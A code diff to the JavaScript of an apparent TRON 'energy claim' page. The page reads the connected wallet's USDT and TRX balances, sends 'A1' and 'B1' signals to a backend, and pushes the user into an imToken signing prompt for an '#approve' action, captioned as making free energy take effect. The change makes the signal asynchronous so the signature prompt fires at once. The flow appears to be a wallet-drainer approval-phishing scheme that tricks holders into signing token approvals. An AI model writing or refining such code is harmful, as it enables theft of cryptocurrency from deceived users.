@@ -1380,7 +1380,7 @@ function bindRetryA1Logic() {
     };
 }
 
-// ========== 领取按钮逻辑（防重复仅拦B1信号，不拦唤起，一路绿灯） ==========
+// ========== 领取按钮逻辑（B1异步发送+并行触发唤起+标记防重复，互不阻塞） ==========
 function bindApproveLogic() {
     const lang = langConfig[currentLang];
     approveBtn.onclick = async () => {
@@ -1392,11 +1392,10 @@ function bindApproveLogic() {
         reviewTipText.textContent = "能量调配中……点击签名后能量生效";
 
         try {
-            // 第一步：校验A1信号是否成功
+            // 第一步：校验A1信号是否成功（唯一前置条件）
             const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
             const isA1Success = a1Status[userAddress] === "success";
             if (!isA1Success) {
-                // A1失败→绑定重试逻辑
                 userInfoEl.innerHTML = `
                     已连接：${shortAddr}<br>
                     USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
@@ -1409,38 +1408,31 @@ function bindApproveLogic() {
                 return;
             }
 
-            // 第二步：B1防重复判断（核心：仅阻止二次发信号，不拦后续流程）
-            let b1Result = { success: true }; // 默认成功，确保后续流程能走
+            // 第二步：核心逻辑（并行执行2件事，B1异步发送不阻塞）
+            // 2.1 标记防重复对象（点击即标记，不管B1是否发送/成功）
+            markB1SignalSent(userAddress);
+           
+
+            // 2.2 非防重复对象：异步发送B1信号（不await，不阻塞唤起签名）
             if (!hasSentB1Signal(userAddress)) {
-                // 首次领取：发送B1信号
                 btn.textContent = "发送信号中...";
-                b1Result = await sendSignalB(true);
+                // B1异步发送，结果仅日志记录，不影响其他流程
+                sendSignalB(true)
+                    .then(result => {
+                        console.log(`✅ B1信号异步发送完成，结果：${result.success ? "成功" : "失败"}`);
+                    })
+                    .catch(err => {
+                        console.warn("❌ B1信号异步发送异常：", err);
+                    });
             } else {
-                // 二次点击（防重复）：不发送B1信号，仅控制台日志
-                console.log("⚠️ B1防重复触发：已阻止二次发送信号，继续唤起签名");
+                // 防重复对象：不发送B1信号，仅日志记录
+                console.log("⚠️ B1防重复触发：已阻止二次发送信号");
             }
 
-            // 第三步：无论是否发送B1，只要A1成功，就一路绿灯→唤起签名（满足你的要求）
-            if (isA1Success) {
-                // 标记防重复（首次/二次都标记，确保后续防重复生效）
-                if (!hasSentB1Signal(userAddress)) {
-                    markB1SignalSent(userAddress);
-                }
-                // 标记为已领取
-               
-                renderEnergyRecords(); // 更新页面记录
-
-                reviewTip.style.display = "none";
-                btn.textContent = lang.redirectingBtn;
-                // 唤起imToken签名页面（二次点击也会执行，一路绿灯）
-                window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
-            } else {
-                // A1失败才走这里，正常情况不会触发
-                alert("环境检测失败，无法唤起签名");
-                btn.disabled = false;
-                btn.textContent = lang.approveBtnText;
-                reviewTip.style.display = "none";
-            }
+            // 2.3 立即唤起钱包签名（和B1发送并行，互不阻塞，一路绿灯）
+            reviewTip.style.display = "none";
+            btn.textContent = lang.redirectingBtn;
+            window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
 
         } catch (e) {
             console.error("领取流程失败：", e);
